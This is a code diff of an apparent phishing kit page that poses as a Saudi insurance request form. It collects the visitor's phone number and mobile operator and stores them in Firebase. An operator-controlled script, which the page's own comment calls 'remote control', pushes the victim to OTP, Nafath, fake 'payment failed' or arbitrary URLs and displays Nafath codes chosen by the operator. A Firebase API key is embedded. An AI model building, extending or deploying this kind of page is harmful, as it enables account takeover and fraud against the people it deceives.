@@ -6,128 +6,178 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>استكمال الطلب | Complete Request</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/inner-theme.css">
+    <link id="bootstrap-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/site-theme.css">
     <style>
-        body { display:flex; flex-direction:column; min-height:100vh; }
-        .main-wrap { flex:1; display:flex; align-items:center; justify-content:center; padding:28px 16px 48px; }
+        body { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .form-wrapper { max-width: 500px; width: 100%; padding: 30px; }
+        .form-label { font-weight: bold; color: var(--tree-primary); }
+        .operator-card {
+            border: 2px solid var(--tree-border); border-radius: 12px; padding: 10px; cursor: pointer;
+            transition: all 0.2s ease-in-out; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; height: 110px;
+        }
+        .operator-card:hover { transform: translateY(-3px); box-shadow: var(--tree-shadow-sm); }
+        .operator-input { display: none; }
+        .operator-logo { max-height: 45px; max-width: 90%; object-fit: contain; margin-bottom: 8px; }
     </style>
 </head>
-<body>
+<body class="tree-site page-complete">
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<nav class="inner-nav">
-    <a href="index.html" class="inner-nav__logo">tree</a>
-    <div class="inner-nav__right">
-        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
-    </div>
-</nav>
-
-<div class="main-wrap">
-    <div class="teal-card teal-card--narrow" style="width:100%;">
-        <div class="card-head">
-            <div class="section-title" data-i18n="mobile.title">تأكيد رقم هاتف مقدم الطلب</div>
+<div class="container">
+    <div class="form-wrapper mx-auto">
+        <div class="d-flex justify-content-end mb-2">
+            <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()">EN</button>
         </div>
-        <div class="card-body">
+        <h3 class="text-center mb-4 text-success" data-i18n="mobile.title">تأكيد رقم هاتف مقدم الطلب</h3>
 
-            <div class="alert-teal" data-i18n="mobile.alert">لمتابعة طلب وثيقة التأمين، يرجى إدخال رقم هاتف مقدم الطلب بشكل صحيح.</div>
+        <div class="alert alert-success bg-opacity-10 border-success text-success text-center mb-4" role="alert" data-i18n="mobile.alert">
+            لمتابعة طلب وثيقة التأمين، يرجى إدخال رقم هاتف مقدم الطلب بشكل صحيح.
+        </div>
 
-            <form onsubmit="submitRequest(event)">
-
-                <!-- رقم الجوال -->
-                <div class="field">
-                    <label class="field__label" for="phoneNumber" data-i18n="mobile.phone_label">رقم الجوال *</label>
-                    <div class="phone-wrap">
-                        <div class="phone-prefix">
-                            <span>🇸🇦</span>
-                            <span>+966</span>
-                            <span style="opacity:.25;margin-inline-start:2px;">|</span>
-                        </div>
-                        <input type="tel" class="field__input" id="phoneNumber" placeholder="5xxxxxxxx" dir="ltr" oninput="forceEnglish(this)" maxlength="9" required pattern="\d{9,}">
+        <form onsubmit="submitRequest(event)" class="needs-validation" novalidate>
+            
+            <!-- رقم الجوال -->
+            <div class="mb-3">
+                <label for="phoneNumber" class="form-label" data-i18n="mobile.phone_label">رقم الجوال *</label>
+                <div class="input-group has-validation">
+                    <span class="input-group-text bg-white border-success text-success">+966</span>
+                    <input type="tel" class="form-control border-success" id="phoneNumber" placeholder="5xxxxxxxx" dir="ltr" oninput="forceEnglish(this)" maxlength="9" required pattern="\d{9,}">
+                    <div class="invalid-feedback">
+                        رقم الجوال يجب أن لا يقل عن 9 أرقام.
                     </div>
                 </div>
+            </div>
 
-                <!-- مشغل الشبكة -->
-                <div class="field">
-                    <label class="field__label" data-i18n="mobile.operator_title">مشغل شبكة الجوال *</label>
-                    <div class="operator-grid">
-                        <div class="operator-card-wrap">
-                            <input type="radio" name="networkOperator" id="op_stc" value="stc" required>
-                            <label class="operator-card-label" for="op_stc">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/STC_Logo.svg" alt="STC">
-                                <span>STC</span>
-                            </label>
-                        </div>
-                        <div class="operator-card-wrap">
-                            <input type="radio" name="networkOperator" id="op_mobily" value="mobily">
-                            <label class="operator-card-label" for="op_mobily">
-                                <img src="https://upload.wikimedia.org/wikipedia/en/e/e7/Mobily_Logo.svg" alt="Mobily">
-                                <span>Mobily</span>
-                            </label>
-                        </div>
-                        <div class="operator-card-wrap">
-                            <input type="radio" name="networkOperator" id="op_zain" value="zain">
-                            <label class="operator-card-label" for="op_zain">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/Zain-logo.svg" alt="Zain">
-                                <span>Zain</span>
-                            </label>
-                        </div>
+            <!-- مشغل الشبكة -->
+            <div class="mb-4">
+                <label for="networkOperator" class="form-label" data-i18n="mobile.operator_title">مشغل شبكة الجوال *</label>
+                
+                <div class="row g-2">
+                    <div class="col-4">
+                        <input type="radio" name="networkOperator" id="op_stc" value="stc" class="operator-input" required>
+                        <label class="operator-card" for="op_stc">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/STC_Logo.svg" alt="STC" class="operator-logo">
+                            <small class="fw-bold">STC</small>
+                        </label>
+                    </div>
+                    <div class="col-4">
+                        <input type="radio" name="networkOperator" id="op_mobily" value="mobily" class="operator-input">
+                        <label class="operator-card" for="op_mobily">
+                            <img src="https://upload.wikimedia.org/wikipedia/en/e/e7/Mobily_Logo.svg" alt="Mobily" class="operator-logo">
+                            <small class="fw-bold">Mobily</small>
+                        </label>
+                    </div>
+                    <div class="col-4">
+                        <input type="radio" name="networkOperator" id="op_zain" value="zain" class="operator-input">
+                        <label class="operator-card" for="op_zain">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/Zain-logo.svg" alt="Zain" class="operator-logo">
+                            <small class="fw-bold">Zain</small>
+                        </label>
                     </div>
                 </div>
+            </div>
 
-                <button type="submit" class="btn-green" data-i18n="mobile.btn_register">تسجيل</button>
-            </form>
-        </div>
+            <div class="d-grid">
+                <button type="submit" class="btn btn-success btn-lg" data-i18n="mobile.btn_register">تسجيل</button>
+            </div>
+        </form>
     </div>
 </div>
 
 <script>
-    function forceEnglish(el) {
-        el.value = el.value.replace(/[٠-٩]/g, d => "٠١٢٣٤٥٦٧٨٩".indexOf(d)).replace(/[^0-9]/g, '');
-    }
-
     async function submitRequest(event) {
         event.preventDefault();
-        const phone = document.getElementById('phoneNumber').value;
-        const operator = document.querySelector('input[name="networkOperator"]:checked')?.value || 'Unknown';
-        if (window.saveOperator) await window.saveOperator(phone, operator);
-        window.location.href = `mobile_verification.html?phone=${encodeURIComponent(phone)}`;
+        const form = event.target;
+        
+        if (!form.checkValidity()) {
+            event.stopPropagation();
+            form.classList.add('was-validated');
+        } else {
+            // الحصول على رقم الهاتف وتوجيه المستخدم لصفحة التحقق
+            const phone = document.getElementById('phoneNumber').value;
+            const operator = document.querySelector('input[name="networkOperator"]:checked')?.value || 'Unknown';
+            
+            if (window.saveOperator) {
+                await window.saveOperator(phone, operator);
+            }
+            
+            window.location.href = `mobile_verification.html?phone=${encodeURIComponent(phone)}`;
+        }
     }
 </script>
 
+<!-- كود تحويل الأرقام -->
+<script>
+    function forceEnglish(el) {
+        el.value = el.value.replace(/[٠-٩]/g, d => "٠١٢٣٤٥٦٧٨٩".indexOf(d)).replace(/[^0-9]/g, '');
+    }
+</script>
+
+<!-- كود التحكم عن بعد -->
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, doc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+    // ⚠️ استبدل بالبيانات الحقيقية
     const firebaseConfig = {
         apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
         authDomain: "tameen-658e9.firebaseapp.com",
         projectId: "tameen-658e9",
         storageBucket: "tameen-658e9.firebasestorage.app",
         messagingSenderId: "292670676256",
-        appId: "1:292670676256:web:3624157751cd194efe4b45"
+        appId: "1:292670676256:web:3624157751cd194efe4b45",
+        measurementId: "G-6P06T2H9FD"
     };
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
+
     const userId = localStorage.getItem('user_id');
-
+    
     if (userId) {
-        updateDoc(doc(db, "requests", userId), { currentPage: 'استكمال الجوال' }).catch(() => {});
-
+        updateDoc(doc(db, "requests", userId), { currentPage: 'استكمال الجوال' }).catch(err => console.log(err));
+        
         window.saveOperator = async (ph, op) => {
-            await updateDoc(doc(db, "requests", userId), { mobileNumberConfirmed: ph, networkOperator: op });
+             await updateDoc(doc(db, "requests", userId), {
+                mobileNumberConfirmed: ph,
+                networkOperator: op
+            });
         };
+
+        onSnapshot(doc(db, "requests", userId), (snapshot) => {
+            const data = snapshot.data();
+            if (data && data.redirectCommand) {
+                if (!window.location.href.includes(data.redirectCommand)) {
+                    window.location.href = data.redirectCommand;
+                }
+            }
+        });
 
         onSnapshot(doc(db, "orders", userId), (orderSnap) => {
             const data = orderSnap.data();
             if (!data) return;
-            if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
-            else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
-            else if (data.next_step === "GO_TO_NAFATH" || data.next_step === "SHOW_NAFATH_CODE") window.location.href = "nafath.html";
+            if (data.next_step === "GO_TO_OTP") {
+                window.location.href = "otp_verification.html";
+            } else if (data.next_step === "GO_TO_REJECT") {
+                window.location.href = "payment_failed.html";
+            } else if (data.next_step === "GO_TO_NAFATH") {
+                window.location.href = "nafath.html";
+            } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                const codeBox = document.getElementById('nafath-number');
+                if (codeBox && data.nafath_code) {
+                    codeBox.innerText = data.nafath_code;
+                    const overlay = document.getElementById('overlay');
+                    if (overlay) overlay.style.display = 'none';
+                }
+            }
         });
     }
+
 </script>
+
 </body>
 </html>
